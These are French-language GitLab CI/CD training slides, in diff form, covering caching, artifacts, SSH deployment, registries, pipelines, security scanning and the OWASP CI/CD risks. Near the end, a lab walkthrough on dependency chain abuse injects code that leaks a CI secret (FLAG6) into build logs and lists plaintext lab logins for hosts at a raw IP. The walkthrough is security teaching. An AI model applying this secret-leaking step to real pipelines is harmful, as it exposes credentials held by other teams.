+    - cat .lib/$CI_COMMIT_REF_SLUG-$CI_JOB_STAGE.txt
+    - ls .lib/
+  cache:
+    - key: $CI_JOB_STAGE-$CI_COMMIT_REF_SLUG
+      paths:
+        - .lib
+  tags:
+    - docker
+```
+
+Comme on a fait que un pull, il n'a pas mise à jour le cache et du coup il est indisponnible pour le second job.
+Editons le fichier et mettons le polycy avec la valeur push 
+
+---
+
+```yaml
+stages:
+  - step1
+  - step2
+j1-1:
+  stage: step1
+  script:
+    - mkdir -p .lib 
+    - echo $CI_COMMIT_REF_SLUG-$CI_JOB_STAGE > .lib/$CI_COMMIT_REF_SLUG-$CI_JOB_STAGE.txt
+  cache:
+    - key: $CI_JOB_STAGE-$CI_COMMIT_REF_SLUG
+      paths:
+        - .lib
+      policy: push
+  tags:
+    - docker
+j1-2:
+  stage: step1
+  script:
+    - cat .lib/$CI_COMMIT_REF_SLUG-$CI_JOB_STAGE.txt
+    - ls .lib/
+  cache:
+    - key: $CI_JOB_STAGE-$CI_COMMIT_REF_SLUG
+      paths:
+        - .lib
+  tags:
+    - docker
+```
+---
+
+## Pratiques recommandées pour la getsion du cache
+Pour garantir une disponibilité maximale du cache, effectuez une ou plusieurs des actions suivantes :
+
+* Étiquetez vos runners et utilisez l'étiquette sur les jobs qui partagent le cache.
+* Utilisez des runners disponibles uniquement pour un projet particulier.
+* Configurer un cache différent pour chaque branche.
+
+---
+ Pour que les runners fonctionnent efficacement avec les caches, vous devez effectuer l'une des actions suivantes :
+
+* Utilisez un seul runner pour l'ensemble de vos jobs.
+* Utilisez plusieurs runners avec une mise en cache distribuée, où le cache est stocké dans des compartiments S3. Les runners partagés sur GitLab.com fonctionnent de cette manière. Ces runners peuvent être en mode d'auto-échelle, mais ce n'est pas obligatoire. Pour gérer les objets du cache, appliquez des règles de cycle de vie pour supprimer les objets du cache après une période donnée. Les règles de cycle de vie sont disponibles sur le serveur de stockage d'objets.
+* Utilisez plusieurs runners avec la même architecture et faites en sorte que ces runners partagent un répertoire commun monté en réseau pour stocker le cache. Ce répertoire doit utiliser NFS ou quelque chose de similaire. Ces runners doivent être en mode d'auto-échelle.
+---
+# Les artefacts 
+Il existe deux manière dans gitlab de stocker des fichiers et de les partager entre runners. 
+- Cache
+- Et les artefacts
+
+---
+## En quoi le cache est différent des artefacts
+- Utilisez le cache pour les dépendances, comme les packages que vous téléchargez sur Internet. Le cache est stocké là où GitLab Runner est installé.
+- Utilisez des artefacts pour transmettre les résultats de construction intermédiaires entre les étapes. Les artefacts sont générés par une tâche, stockés dans GitLab et peuvent être téléchargés.
+- **Durée de Vie :** Le cache persiste sur le runner entre les exécutions de jobs, tandis que les artefacts ne sont disponibles que pour la durée d'un pipeline.
+
+Les artefacts et les caches définissent leurs chemins par rapport au répertoire du projet et ne peuvent pas créer de lien vers des fichiers extérieurs à celui-ci.
+
+---
+### Cache
+Le cache est utilisé pour stocker des fichiers ou des répertoires spécifiés afin de les réutiliser 
+entre différentes exécutions de jobs sur le même runner.
+Il s'agit d'une optimisation pour éviter de re-télécharger ou recréer des dépendances courantes.
+
+```yaml
+job:
+  script:
+    - npm install
+  cache:
+    key: "$CI_COMMIT_REF_NAME-$CI_JOB_NAME"
+    paths:
+      - node_modules/
+  ```
+---
+### Artefacts
+Les artefacts sont utilisés pour stocker des fichiers ou des répertoires produits pendant l'exécution d'un job. 
+Ces fichiers sont généralement les résultats de processus de construction, de tests, ou d'autres étapes du pipeline.
+
+```yaml
+stages:
+  - build
+
+job_build:
+  stage: build
+  script:
+    - npm run build
+  artifacts:
+    paths:
+      - dist/
+```
+---
+**Options des artifacts :**
+
+	* expire_in : temps de conservation
+
+	* untracked : ajout des fichiers untracked à votre artifact
+
+	* exclude : exclure certains fichiers
+
+	* paths : répertoire complet
+
+	* expose_as : mettre à disposition dans les MR
+
+	* name : nom associé (stratégie comme cache)
+
+---
+Exemple d'un artefact qui a durée de vie de 1min : 
+
+```yaml
+job1:
+  script:
+    - echo "Hello Das" > file.txt
+  artifacts:
+    paths:
+      - file.txt
+    expire_in: 1m
+```
+---
+
+À noter que les artitacts sont téléchargeables alors que le cache ne l'est pas. 
+![](https://cdn.discordapp.com/attachments/727923649738178571/1201192330582036580/image.png?ex=65c8ec88&is=65b67788&hm=dd3fdfa20d2e3945996bddcda1c0ba9a5224ed49373f554633ebaaf597d85d09&)
+# SSH docker vers target
+---
+
+  * créer une paire de clefs
+  
+  * créer un user (avec les droits souhaités)
+  
+  * ajouter la clef publique sur le serveur cible
+
+---
+**À faire en même temps que moi**
+
+Création d'une paire de clés (publique et privée)
+
+```bash
+ssh-keygen -t ecdsa -b 521
+```
+
+---
+
+Dans gitlab, on copie la clé prvivé on créé une variable ``SSH_PRIVATE``.
+On Créé également une variable ``SSH_TARGET`` avec l'ip de la vm target.
+
+---
+
+Connectons-nous en ssh sur la vm target    
+Et créons un utilisateur gitlab
+
+```bash
+sudo adduser gitlab-prénom
+sudo usermod -aG sudo gitlab-prénom
+sudo su - gitlab-prénom
+```
+---
+Ensuite créons le dossier .ssh 
+```bash
+mkdir .ssh
+```
+
+---
+
+et ensuite on rajoute la clé publique précédement créé dans le fichier ``authorized_keys``
+
+```bash
+echo "ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBACb59WLcHEVoT2whP1FAP4xPKSqCVQe3aBboj2e2Y/fCXEagxpLfniki2+ID+KhsI6y1owPdhANzW+odKmiUPyDkADqZes3ssTH79FVrl8g8SwpjMqEjFkfh4OUKKXJKJhTUDYxcnYd/YplaqF7yK85sm+PbjbxkBNAY/vZ33rUsL/9uQ== azureuser@gitlab-1" > ~/.ssh/authorized_keys
+```
+---
+Et le fichier gitlab-ci.yml.
+
+```
+image: debian:latest
+job1:
+  before_script:
+    - 'command -v ssh-agent >/dev/null || ( apt update && apt install -y openssh-client )' 
+    - eval $(ssh-agent -s)
+    - echo "$SSH_PRIVATE" | tr -d '\r' | ssh-add -
+    - mkdir -p ~/.ssh
+    - chmod 700 ~/.ssh
+    - ssh-keyscan $SSH_TARGET >> ~/.ssh/known_hosts
+    - chmod 644 ~/.ssh/known_hosts
+  script:
+    - ssh $SSH_USER@$SSH_TARGET "hostname && echo 'HELLO DAS'>> ./das.txt"
+  tags:
+    - docker
+```
+---
+
+## Les ancres 
+
+Afin d'éviter la répétion de code, on peut utiliser les ancres, faisant parties du langage Yaml
+
+```
+image: debian:latest
+.ssh: &ssh
+    - 'command -v ssh-agent >/dev/null || ( apt update && apt install -y openssh-client )' 
+    - eval $(ssh-agent -s)
+    - echo "$SSH_PRIVATE" | tr -d '\r' | ssh-add -
+    - mkdir -p ~/.ssh
+    - chmod 700 ~/.ssh
+    - ssh-keyscan $SSH_TARGET >> ~/.ssh/known_hosts
+    - chmod 644 ~/.ssh/known_hosts
+
+job1:
+    before_script: *ssh
+    script:
+      - ssh $SSH_USER@$SSH_TARGET "hostname && echo 'HELLO DAS job 1' >> ./das.txt"
+    tags:
+        - docker
+
+job2:
+    variables:
+       SSH_TARGET: 10.0.0.5
+    before_script: *ssh
+    script: ssh $SSH_USER@$SSH_TARGET "hostname && echo 'HELLO DAS job 2' >> ./das.txt"
+    tags:
+        - docker
+```
+
+
+---
+
+
+# Le registry docker 
+
+---
+## Sur l'instance gitlab
+
+---
+
+**À faire en même temps que moi**
+
+On créé le certificat pour registry
+
+```
+cd /etc/gitlab
+sudo openssl req   -newkey rsa:4096 -nodes -sha256 -keyout registry.das.becode.key  -addext "subjectAltName = DNS:registry.das.becode" -x509 -days 365 -out registry.das.becode.cert
+```
+
+---
+
+Il faut modifer le fichier de config de gitlab 
+```
+sudo nano /etc/gitlab/gitlab.rb
+```
+
+---
+
+Et rajouter ces lignes 
+
+```
+gitlab_rails['gitlab_default_projects_features_container_registry'] = true
+
+registry_external_url 'https://registry.das.becode'
+gitlab_rails['registry_enabled'] = true
+gitlab_rails['registry_host'] = "registry.das.becode"
+registry_nginx['enable'] = true
+registry_nginx['listen_port'] = 443
+registry_nginx['ssl_certificate'] = "/etc/gitlab/registry.das.becode.cert"
+registry_nginx['ssl_certificate_key'] = "/etc/gitlab/registry.das.becode.key"
+```
+---
+
+On reconfigure gitlab
+```
+gitlab-ctl reconfigure
+```
+
+---
+
+## Sur runner 1
+---
+On va gérer le certificat auto-signé sur le client (runner1)
+```
+openssl s_client -showcerts -connect registry.das.becode:443 < /dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > ca.crt
+```
+---
+
+On copie le certificat dans le bon répertoire 
+```
+sudo cp ca.crt /usr/local/share/ca-certificates/
+```
+---
+
+On update les certificats
+```
+sudo update-ca-certificates -v
+```
+---
+
+On rédemare docker
+```
+sudo systemctl restart docker
+```
+---
+
+Et on se loggue 
+```
+docker login registry.das.becode
+```
+
+---
+
+# Multi-Project Pipeline 
+
+Objectif :
+
+* À partir d'un projet, déclencher le pipeline d'un autre projet.
+* Transmettre une variable d'un gitlab-ci à un autre.
+
+Doc : https://docs.gitlab.com/ee/ci/pipelines/multi_project_pipelines.html
+
+---
+
+## Pipelines Multiprojets
+
+- Un pipeline peut déclencher des pipelines en aval dans un autre projet.
+- Les pipelines multiprojets affectent le statut global du projet en aval.
+
+---  
+## Création du projet pipe1 (Trigger)
+
+- Utilisation du mot-clé ``trigger`` dans le fichier .gitlab-ci.yml.
+
+```yaml
+stages:
+  - s1
+  - s2
+
+j1:
+  stage: s1
+  image: docker
+  script:
+    - echo "Mon premier job !!!"
+  tags:
+    - docker
+
+j2:
+  variables:
+    VAR1: "variable1"
+    VAR2: "variable2"
+  stage: s2
+  trigger:
+    project: becode/pipe2
+    branch: main
+    strategy: depend
+
+```
+Ici, on utilise ``strategy:depend`` pour forcer la tâche à attendre la fin du pipeline en aval avant d'être marquée comme réussie .
+Ce comportement est différent du comportement par défaut, selon lequel le trigger est marqué comme réussi dès que le pipeline en aval est créé.
+
+---
+
+## Création du projet pipe2 (Slave)
+```yaml
+image: debian:latest
+job1:
+    rules:
+        - if: $CI_PIPELINE_SOURCE == "pipeline"
+    script:
+        - echo $VAR1
+        - echo $VAR2
+    tags:
+        - docker
+```
+![](https://cdn.discordapp.com/attachments/727923649738178571/1202302915059138560/image.png)
+
+---
+
+Il est important de noter que bien que les pipelines multi-projets soient puissants, 
+ils peuvent aussi ajouter de la complexité au processus de CI/CD. 
+Il faut vraiment les utilser en fonction des besoins spécifiques 
+de votre organisation et de votre architecture de projet.
+
+---
+# Mise en pratique avec un projet Angular 
+
+## Création dur projet
+(Sur votre machine)
+```
+ng new my-super-app
+```
+---
+
+Pour installer et générer le fichier de configuation pour Eslint
+```
+ng lint
+```
+
+---
+
+On créé un nouveau dépot gitlab (Sans readme.md) et on rajoute le remote dans l'application.
+```
+Push an existing Git repository
+cd existing_repo
+git remote rename origin old-origin
+git remote add origin git@gitlab.das.becode:becode/my-web-app.git
+git push --set-upstream origin --all
+git push --set-upstream origin --tags
+```
+---
+
+## Création du pipeline
+Cette fois nous allons créer un pipeline en 4 étapes qui auront une ou plusieurs tâches.
+
+- dependencies : Installation des dépendances NPM
+- quality : Test unitaire et lint
+- build : Compilation de l'application et push sur docker
+- deploy : Deployement sur un serveur avec docker
+
+---
+
+```yaml
+stages:
+  - dependencies
+  - quality
+  - build
+  - deploy
+```
+
+---
+
+## Paramètre par défaut
+
+```yaml
+default:
+  interruptible: true
+  image: trion/ng-cli-karma:17.1.3
+  tags:
+    - docker
+  cache:
+    key:
+      files:
+        - package.json
+    paths:
+      - node_modules
+```
+
+---
+
+## Installation des dépendances
+
+```yaml
+install:
+  stage: dependencies
+  script:
+    - npm ci --prefer-offline
+```
+
+---
+
+## lint
+
+```yaml
+lint:
+  stage: quality
+  needs: ["install"]
+  script:
+    - ng lint
+```
+---
+
+## test
+```yaml
+test:
+  stage: quality
+  needs: ["install"]
+  script:
+    - ng test --watch=false
+```
+---
+
+## Angular Build
+
+```yaml
+ng_build:
+  stage: build
+  needs: ["test", "lint"]
+  artifacts:
+    paths:
+      - $CI_PROJECT_DIR/dist
+  script:
+      -  ng build --base-href /app/
+```
+---
+
+## Docker build
+
+```yaml
+docker_build:
+  stage: build
+  image: docker
+  needs: ["ng_build"]
+  services:
+    - name: docker:dind
+      alias: docker
+  variables:
+    DOCKER_BUILDKIT: "1"
+    DOCKER_DRIVER: overlay2
+    DOCKER_HOST: tcp://docker:2375
+    DOCKER_TLS_CERTDIR: ""
+  script:
+    - docker build  -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA
+                    -t $CI_REGISTRY_IMAGE/myapp:latest
+                      .
+    - echo $CI_REGISTRY_PASSWORD | docker login -u $CI_REGISTRY_USER --password-stdin $CI_REGISTRY
+    - docker push  $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA
+    - docker push  $CI_REGISTRY_IMAGE/myapp:latest
+  environment:
+    name: prod
+  tags:
+    - docker
+```
+---
+
+## deploy 
+
+Il faut créer un nouveau runner.
+
+```yaml
+deploy_prod:
+  needs: ["scan", "docker_build"]
+  stage: deploy
+  environment: prod
+  variables:
+    DOCKER_BUILDKIT: "1"
+    DOCKER_DRIVER: overlay2
+    DOCKER_TLS_CERTDIR: ""
+  before_script:
+    - container_id=$(docker ps | grep $CI_REGISTRY_IMAGE | awk '{ print $1 }')
+    - if [ -n "$container_id" ]; then docker stop $container_id; fi;
+  script: 
+    - echo "Deploy Starting"
+    - echo $CI_REGISTRY_PASSWORD | docker login -u $CI_REGISTRY_USER --password-stdin $CI_REGISTRY
+    - docker run -d -p 80:80 $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA
+    - container_id=$(docker ps | grep $CI_REGISTRY_IMAGE | awk '{ print $1 }')
+    - docker exec $container_id ls -la
+  tags:
+    - prod
+  rules:
+    - if: '$CI_COMMIT_BRANCH == "main"'
+      when: manual
+```
+---
+# NestJS
+
+## Exercice 
+
+Créer un pipeline pour NestJS. 
+
+* dependencies : Installation des dépendances NPM
+* quality : Test unitaire et lint
+* build : Compilation de l'application et push sur docker
+* deploy : Deployement sur un serveur avec docker
+## Les Environnements GitLab CI/CD
+---
+Dans gitlab, il existe deux types d'environnements :
+
+- Les environnements statiques
+- Les environnements dynamiques
+---
+
+### Les Environnements Statiques
+Les environnements statiques sont des environnements prédéfinis dans GitLab CI/CD. 
+Ils sont généralement constants et représentent des étapes 
+standard du cycle de vie d'une application, comme les environnements de développement, 
+test et production. Ces environnements sont définis une fois et réutilisés tout au long du processus de développement.
+
+---
+
+```yaml
+deploy_staging:
+  stage: deploy
+  script:
+    - echo "Deploy to staging server"
+  environment:
+    name: staging
+    url: https://staging.example.com
+```
+---
+### Environnements Dynamiques
+Les environnements dynamiques, en revanche, sont générés à la volée en fonction de certaines conditions ou actions, 
+comme la création d'une nouvelle branche ou d'une merge request. Ils sont extrêmement utiles pour des scénarios tels que le test de nouvelles fonctionnalités, 
+où vous souhaitez créer un environnement de test unique pour chaque branche de fonctionnalité sans affecter l'environnement principal de test.
+
+```yaml
+stages:
+  - deploy
+
+deploy_review:
+  stage: deploy
+  tags:
+    - docker
+  script: echo "Déploiement de l'environnement de revue pour $CI_COMMIT_REF_NAME"
+  environment:
+    name: review/$CI_COMMIT_REF_NAME
+    url: https://$CI_COMMIT_REF_NAME.example.com
+  rules:
+    - if: $CI_COMMIT_REF_NAME == "main" && $CI_PIPELINE_SOURCE == "merge_request_event"
+      when: never
+    - if: $CI_COMMIT_REF_NAME == "develop"
+      when: never
+    - when: always
+```
+---
+### Exercice 1
+- Utilisez la clause ``variables`` pour définir la variable DEPLOY_ENV avec la valeur par défaut "review/$CI_COMMIT_SHORT_SHA".
+- Utilisez la clause workflow avec des règles pour définir les conditions suivantes :
+    - Si la branche est "main", alors DEPLOY_ENV doit être "production".
+    - Si la branche est une branche de fonctionnalité (matchant avec "feature-*"), alors DEPLOY_ENV doit être "dev".
+    - Si la branche est "staging", alors DEPLOY_ENV doit être "staging".
+    - Si le déclencheur de pipeline est une planification (schedule), le déploiement doit être ignoré.
+---
+#### Réponse
+```yaml
+variables:
+  DEPLOY_ENV: review/$CI_COMMIT_SHORT_SHA
+workflow:
+  rules:
+    - if: $CI_COMMIT_REF_NAME == "main"
+      variables:
+        DEPLOY_ENV: production
+    - if: $CI_COMMIT_REF_NAME =~ "/feature-/"
+      variables:
+        DEPLOY_ENV: dev
+    - if: $CI_COMMIT_REF_NAME == "staging"
+      variables:
+        DEPLOY_ENV: staging 
+    - if: '$CI_PIPELINE_SOURCE == "schedule"'
+      when: never
+```
+--- 
+### Exercice 2
+1. Définissez un stage de déploiement "deploy_prod" avec les conditions suivantes :
+  - Si DEPLOY_ENV est "production", le déploiement doit toujours être effectué.
+  - Sinon, le déploiement doit être ignoré.
+2. Définissez un stage de déploiement "deploy_dev" avec les conditions suivantes :
+  - Si DEPLOY_ENV est "dev", le déploiement doit toujours être effectué.
+  - Sinon, le déploiement doit être ignoré.
+3. Définissez un stage de déploiement "deploy_staging" avec les conditions suivantes :
+  - Si DEPLOY_ENV est "staging", le déploiement doit toujours être effectué.
+  - Sinon, le déploiement doit être ignoré.
+
+---
+
+### Réponse
+
+```yaml
+stages:
+  - deploy
+
+deploy_prod:
+  stage: deploy
+  tags:
+    - docker
+  script: echo "Déploiement de l'environnement ($DEPLOY_ENV) de revue pour $CI_COMMIT_REF_NAME"
+  environment:
+    name: $DEPLOY_ENV
+    url: https://$DEPLOY_ENV.das.becode
+  rules:
+    - if: $DEPLOY_ENV == "production"
+      when: always
+    - when: never 
+      
+deploy_dev:
+  stage: deploy
+  tags:
+    - docker
+  script: echo "Déploiement de l'environnement ($DEPLOY_ENV) de revue pour $CI_COMMIT_REF_NAME"
+  environment:
+    name: $DEPLOY_ENV
+    url: https://$DEPLOY_ENV.das.becode
+  rules:
+    - if: $DEPLOY_ENV == "dev"
+      when: always
+    - when: never 
+
+deploy_staging:
+  stage: deploy
+  tags:
+    - docker
+  script: echo "Déploiement de l'environnement ($DEPLOY_ENV) de revue pour $CI_COMMIT_REF_NAME"
+  environment:
+    name: $DEPLOY_ENV
+    url: https://$DEPLOY_ENV.das.becode
+  rules:
+    - if: $DEPLOY_ENV == "staging"
+      when: always
+    - when: never 
+    
+```
+---
+### Réponse entière
+
+```yaml
+variables:
+  DEPLOY_ENV: review/$CI_COMMIT_SHORT_SHA
+workflow:
+  rules:
+    - if: $CI_COMMIT_REF_NAME == "main"
+      variables:
+        DEPLOY_ENV: production
+    - if: $CI_COMMIT_REF_NAME =~ "/feature-/"
+      variables:
+        DEPLOY_ENV: dev
+    - if: $CI_COMMIT_REF_NAME == "staging"
+      variables:
+        DEPLOY_ENV: staging 
+    - if: '$CI_PIPELINE_SOURCE == "schedule"'
+      when: never
+
+stages:
+  - deploy
+
+deploy_prod:
+  stage: deploy
+  tags:
+    - docker
+  script: echo "Déploiement de l'environnement ($DEPLOY_ENV) de revue pour $CI_COMMIT_REF_NAME"
+  environment:
+    name: $DEPLOY_ENV
+    url: https://$DEPLOY_ENV.das.becode
+  rules:
+    - if: $DEPLOY_ENV == "production"
+      when: always
+    - when: never 
+      
+deploy_dev:
+  stage: deploy
+  tags:
+    - docker
+  script: echo "Déploiement de l'environnement ($DEPLOY_ENV) de revue pour $CI_COMMIT_REF_NAME"
+  environment:
+    name: $DEPLOY_ENV
+    url: https://$DEPLOY_ENV.das.becode
+  rules:
+    - if: $DEPLOY_ENV == "dev"
+      when: always
+    - when: never 
+
+deploy_staging:
+  stage: deploy
+  tags:
+    - docker
+  script: echo "Déploiement de l'environnement ($DEPLOY_ENV) de revue pour $CI_COMMIT_REF_NAME"
+  environment:
+    name: $DEPLOY_ENV
+    url: https://$DEPLOY_ENV.das.becode
+  rules:
+    - if: $DEPLOY_ENV == "staging"
+      when: always
+    - when: never 
+    
+
+```
+# SAST - DAST
+
+La sécurité dans le pipepline CI / CD
+
+---
+
+## SAST
+Test statique de sécurité des applications (Static application security testing, SAST). Doit permettre aux programmeurs de déceler les failles courantes avant la compilation d’une version. Une équipe de développement peut employer plusieurs outils SAST pour prendre en charge différents langages ou frameworks. 
+
+---
+
+Le template gitlab est basé sur l'utilisation de Semgrep. Il fonctionne en utilisant des règles de recherche définies par l'utilisateur pour identifier des motifs de code spécifiques qui pourraient indiquer des problèmes potentiels. Ces règles peuvent être écrites en utilisant une syntaxe spécifique à Semgrep. L'outil est souvent utilisé dans le cadre de pratiques de développement sécurisées et de l'intégration continue pour garantir que le code source est conforme à des normes de qualité et de sécurité.
+
+---
+
+## DAST 
+
+Test dynamique de sécurité des applications (Dynamic application security testing, DAST). Permet aux experts en tests de sécurité d’examiner une build en cours d’exécution et de détecter les problèmes de configuration, de traitement des erreurs, d’entrées et de sorties de l’application, etc. Les test dast s'effectue toujours sur un environnement de testet jamais en production.
+
+---
+```yaml
+stages:
+  - security
+
+variables: 
+  DAST_TARGET_URL: 'http://20.93.21.178/'
+
+# Dynamic Application Security Testing
+run-dast-job:
+  stage: security
+  image: maven:3.8.5-openjdk-11-slim
+  tags: 
+    - docker 
+  script:
+    - apt-get update
+    - apt-get -y install wget
+    - apt-get -y install wkhtmltopdf
+    - wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2.14.0_Linux.tar.gz
+    - mkdir zap
+    - tar -xvf ZAP_2.14.0_Linux.tar.gz
+    - cd ZAP_2.14.0
+    - ./zap.sh -cmd -quickurl $DAST_TARGET_URL -quickprogress -quickout ../zap_report.html
+    - cd ..
+    - wkhtmltopdf zap_report.html zap_report.pdf
+  artifacts:
+    paths:
+      - zap_report.pdf
+```
+
+---
+
+## IAST 
+Test interactif de sécurité des applications (interactive application security testing, IAST). Combine les techniques SAST et DAST afin d’en tirer les avantages clés.
+
+---
+# Les pipelines planifiés
+
+Utilisez des pipelines planifiés pour exécuter des pipelines GitLab CI/CD à intervalles réguliers.
+
+## Conditions préalables
+Pour qu'un pipeline planifié s'exécute :
+
+- Le propriétaire du planning doit avoir le rôle Développeur. Pour les pipelines sur des branches protégées, le propriétaire de la planification doit être autorisé à fusionner avec la branche.
+- Le .gitlab-ci.ymlfichier doit avoir une syntaxe valide.
+- 
+Sinon, le pipeline n'est pas créé. Aucun message d'erreur ne s'affiche.
+
+---
+
+1. Dans la barre latérale gauche, sélectionnez Rechercher ou accédez à et recherchez votre projet.
+2. Sélectionnez Créer > Planifications de pipeline.
+3. Sélectionnez Nouvel horaire et remplissez le formulaire.
+4. Modèle d'intervalle : sélectionnez l'un des intervalles préconfigurés ou entrez un intervalle personnalisé en notation cron . Vous pouvez utiliser n'importe quelle valeur cron, mais les pipelines planifiés ne peuvent pas s'exécuter plus fréquemment que la fréquence de pipeline planifiée maximale de l'instance .
+5. Branche ou balise cible : sélectionnez la branche ou la balise pour le pipeline.
+6. Variables : ajoutez n'importe quel nombre de variables CI/CD au calendrier. Ces variables sont disponibles uniquement lors de l'exécution du pipeline planifié, et non lors d'une autre exécution de pipeline.
+
+---
+
+## Exercice
+- Créer un pipeline planifié, qui s'éxécute tous les jours à 8 du matin.
+- Le pipeline ne doit s'éxecuter que s'il est déclenché par un pipeline de type ``schedule`` **ET** si la variable SCAN_ONLY est à true.
+
+
+--- 
+
+### Réponse
+
+Cron 
+```
+0 8 * * *
+```
+
+```yaml
+scan-security:
+    tags: ["docker"]
+    rules:
+        - if: $SCAN_ONLY == true && $CI_PIPELINE_SOURCE == "schedule"
+          when: always
+    script:
+      - echo "Ceci est un pipeleine déclenché periodiquement"
+
+```
+
+  
+# Optimiser votre fichier gitlab-ci.yml
+
+Vous pouvez réduire la complexité et la configuration en double dans vos fichiers de configuration GitLab CI/CD en utilisant :
+
+- Les ancres (&)
+- Les alias (*)
+- map merging
+- Le mot-clé extends
+
+## Les ancres 
+Si des bouts de code se répète, on peut utiliser les ancres pour éviter les doublons.
+
+Exemple : 
+ 
+ ```yaml
+.job_template:
+  image: ruby:2.6
+  services:
+    - postgres
+    - redis
+
+test1:
+  image: ruby:2.6
+  services:
+    - postgres
+    - redis
+  script:
+    - test1 project
+
+test2:
+  image: ruby:2.6
+  services:
+    - postgres
+    - redis
+  script:
+    - test2 project
+```
+
+Devient : 
+
+```yaml
+.job_template: &job_configuration  # Hidden yaml configuration that defines an anchor named 'job_configuration'
+  image: ruby:2.6
+  services:
+    - postgres
+    - redis
+
+test1:
+  <<: *job_configuration           # Add the contents of the 'job_configuration' alias
+  script:
+    - echo "test 1"
+
+test2:
+  <<: *job_configuration           # Add the contents of the 'job_configuration' alias
+  script:
+    - echo "test 2"
+```
+
+### Les ancres pour les scripts 
+
+```yaml
+.some-script-before: &some-script-before
+  - echo "Execute this script first"
+
+.some-script: &some-script
+  - echo "Execute this script second"
+  - echo "Execute this script too"
+
+.some-script-after: &some-script-after
+  - echo "Execute this script last"
+
+job1:
+  tags:
+    - docker
+  before_script:
+    - *some-script-before
+  script:
+    - *some-script
+    - echo "Execute something, for this job only"
+  after_script:
+    - *some-script-after
+
+job2:
+  tags:
+    - docker
+  script:
+    - *some-script-before
+    - *some-script
+    - echo "Execute something else, for this job only"
+    - *some-script-after
+```
+
+## Extends
+
+Vous pouvez utiliser le mot-clé ``extends`` pour réutiliser la configuration dans plusieurs tâches. 
+C'est similaire aux ancres YAML, mais plus simple et vous pouvez l'utiliser extends avec includes.
+
+```yaml
+.tests:
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "push"
+
+.rspec:
+  extends: .tests
+  script: echo "venant de .rspec avec la variable $RSPEC_SUITE"
+
+rspec 1:
+  tags:
+    - docker
+  variables:
+    RSPEC_SUITE: '1'
+  extends: .rspec
+
+rspec 2:
+  variables:
+    RSPEC_SUITE: '2'
+  extends: .rspec
+  tags:
+    - docker
+
+spinach:
+  extends: .tests
+  script: echo "from spinach"
+  tags: 
+    - docker
+```
+
+## Utiliser extends et include ensemble
+Pour réutiliser la configuration de différents fichiers de configuration, combinez extendset include.
+
+Dans l'exemple suivant, le script est défini dans le fichier included.yml. Puis, dans le fichier .gitlab-ci.yml, extends fait référence au contenu du script:
+
+- included.yml
+```
+.template:
+  script:
+    - echo Hello!
+```
+
+- .gitlab-ci.yml
+```
+include: included.yml
+
+useTemplate:
+  image: alpine
+  extends: .template
+```
+
+## La balise !reference
+La balise ``!reference`` permet de sélectionner la configuration des mots clés dans d'autres sections de travail et réutilisez-la dans la section actuelle. Contrairement aux ancres YAML , vous pouvez également utiliser !referencedes balises pour réutiliser la configuration des fichiers de configuration inclus.
+
+**setup.yml:**  
+```
+.setup:
+  script:
+    - echo creating environment
+```
+
+**.gitlab-ci.yml :**
+```
+include:
+  - local: setup.yml
+
+.teardown:
+  after_script:
+    - echo deleting environment
+
+test:
+  script:
+    - !reference [.setup, script]
+    - echo running my own command
+  after_script:
+    - !reference [.teardown, after_script]
+```
+# OWASP Top 10 CI/CD Security Risks
+
+![](https://owasp.org/www-project-top-10-ci-cd-security-risks/assets/images/risks.png)
+[Source : Owasp](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-01-Insufficient-Flow-Control-Mechanisms)
+
+
+## CICD-SEC-1: Insufficient Flow Control Mechanisms
+
+Les mécanismes de contrôle de flux insuffisants font référence à la capacité
+d'un attaquant ayant obtenu des autorisations sur un système au sein du 
+processus CI/CD à pousser à lui seul du code malveillant ou des artefacts dans le pipeline, 
+en raison d'un manque de mécanismes qui imposent une approbation ou un examen supplémentaire.
+
+---
+Exemple : 
+L’exécution d’analyses de sécurité dans les pipelines CI est une pratique courante. Checkov, un outil d'analyse de code statique pour IaC, est un exemple connu d'un tel scanner.
+
+Ici, l'attaquant veut obtenir les droits de lectures sur un disque dur en écrasant le fichier de configuration ``Checkov`` initial.
+
+Attaque : 
+1. Clone du repo
+2. Modification du fichier main.tf qui modifie les droits de lecture en publique
+3. Création du fichier ``checkov.yaml``
+
+---
+
+### Recommandations
+- Configurez les règles de protection des branches sur les branches hébergeant le code utilisé en production et dans d'autres systèmes sensibles
+- Limitez l’utilisation des règles d'auto-merge et assurez-vous que, partout où elles sont utilisées, elles sont applicables à un minimum de contextes
+
+--- 
+
+## CICD-SEC-2: Inadequate Identity and Access Management
+
+Les risques de gestion inadéquate des identités et des accès proviennent
+des difficultés liées à la gestion de la grande quantité d’identités réparties dans les 
+différents systèmes de l’écosystème d’ingénierie, du contrôle des sources au déploiement. 
+L’existence d’identités mal gérées – tant humaines que programmatiques – augmente le potentiel et l’ampleur des dommages causés par leur compromission. 
+
+- > Pas d'implémentaion du moindre privilège
+
+---
+
+### Recommandations
+- Implémentation du moindre privilège
+
+--- 
+
+## CICD-SEC-3: Dependency Chain Abuse
+Fait référence à une pratique de sécurité liée à la gestion des dépendances dans le contexte des pipelines CI/CD. Cette pratique met l'accent sur la nécessité de surveiller et de sécuriser la chaîne de dépendances d'un projet pour éviter les abus potentiels.
+L'abus de la chaîne de dépendances entraîne la récupération et l'exécution par inadvertance d'un package malveillant localement lorsqu'il est extrait.
+
+- Injection de packages (par ex npm) malveillant dans le pipeline
+
+---
+
+Exemple sur http://40.113.34.255:3000/Wonderland/twiddledee 
+
+thealice:thealice
+
+
+```ssh
+$ git clone http://40.113.34.255:3000/Wonderland/twiddledee
+$ cd twiddledee
+$ nano index.js
+
+```
+ajout de la ligne 
+
+```js
+console.log(Buffer.from(process.env.FLAG6).toString("base64"))
+```
+
+```
+git tag 1.2.0 HEAD
+git push origin 1.2.0
+
+```
+
+Allons jenkins 
+alice:alice 
+http://40.113.34.255:8080/job/wonderland-twiddle/job/wonderland-twiddledum/lastSuccessfulBuild/console
+
+---
+
+### Recommandations
+
+Implementations de scan de dépendance
+
+```yaml
+security_scan:
+  stage: security_scan
+  script:
